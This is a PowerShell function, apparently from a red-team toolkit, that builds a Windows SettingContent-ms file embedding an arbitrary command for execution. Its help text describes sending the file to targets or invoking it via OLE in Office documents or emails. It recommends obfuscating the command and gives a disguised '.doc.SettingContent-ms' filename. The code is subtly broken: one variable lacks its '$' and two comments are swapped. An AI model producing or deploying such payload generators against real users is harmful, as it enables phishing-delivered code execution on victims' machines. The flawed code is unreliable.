

Function New-SettingContentMSFile()
{
<#

.SYNOPSIS
Create a new SettingContent-ms file with a custom command payload.

.DESCRIPTION
Create new SettingContent-ms file with a custom command execution payload and a custom/copied filename. File can be
sent to target for manual execution or invoked through OLE in Office document or in an email. Returns a
System.IO.FileInfo object of the newly generated file.

.PARAMETER Command
The command to run upon execution of the SettingContent-ms file. Recommend obfuscating it with Invoke-DOSfuscation.

.PARAMETER FileName
Path to the file to write out the payload content. If left empty, will attempt to generate a filename using one of the files
under C:\Windows\ImmersiveControlPanel\*.SettingContent-ms or default to payload_<Date>_<Time>.SettingContent-ms.

.EXAMPLE
New-SettingContentMSFile -Command '%windir%\system32\cmd.exe /c calc.exe' -FileName 'Payload.doc.SettingContent-ms'

.EXAMPLE
New-SettingContentMSFile -Command '%windir%\system32\cmd.exe /c calc.exe'

.LINK
https://posts.specterops.io/the-tale-of-settingcontent-ms-files-f1ea253e4d39

.NOTES
It is recommended, if possible, to drop the payload in to C:\Windows\ImmersiveControlPanel as it is the only directory where
SettingContent-ms files should be located

#>

    Param(
        [Parameter(Mandatory=$True, Position=0, ValueFromPipeline=$True)]
        [String] $Command,
        [Parameter(Mandatory=$False, Position=1)]
        [String] $FileName
    )

    # If filename is not provided, attempt to generate one.
    If ($FileName -eq $Null -or $FileName.Length -eq 0)
    {
        If (Test-Path -Path "C:\Windows\ImmersiveControlPanel")
        {
            $Files = (Get-ChildItem -Path "C:\Windows\ImmersiveControlPanel" -Filter "*.SettingContent-ms" -File).Name
            If ($Files -eq $Null -or $Files.Length -eq 0)  # Attempt to generate a random existing one
            {
                $FileName = ("Payload_{0}.SettingContent-ms" -f (Get-Date -Format "yyyyMMdd_hhmmss"))
            }
            Else  # Default to Payload_<Date>_<Time>.SettingContent-ms
            {
                $FileName = Files[(Get-Random -Minimum 0 -Maximum $Files.Length)]
            }
        }
        Else
        {
            $FileName = ("Payload_{0}.SettingContent-ms" -f (Get-Date -Format "yyyyMMdd_hhmmss"))
        }
    }

    $Payload = @"
<?xml version="1.0" encoding="UTF-8"?>
<PCSettings>
    <SearchableContent xmlns="http://schemas.microsoft.com/Search/2013/SettingContent">
        <ApplicationInformation>
            <AppID>windows.immersivecontrolpanel_cw5n1h2txyewy!microsoft.windows.immersivecontrolpanel</AppID>
            <DeepLink>{0}</DeepLink>
            <Icon>%windir%\system32\control.exe</Icon>
        </ApplicationInformation>
        <SettingIdentity>
            <PageID></PageID>
            <HostID>{12B1697E-D3A0-4DBC-B568-CCF64A3F934D}</HostID>
        </SettingIdentity>
        <SettingInformation>
            <Description>@shell32.dll,-4161</Description>
            <Keywords>@shell32.dll,-4161</Keywords>
        </SettingInformation>
    </SearchableContent>
</PCSettings>
"@

    Remove-Item -Path $FileName -Force -ErrorAction "SilentlyContinue"
    Add-Content -Path $FileName -Value ($Payload -f $Command)
    Get-Item -Path $FileName

}
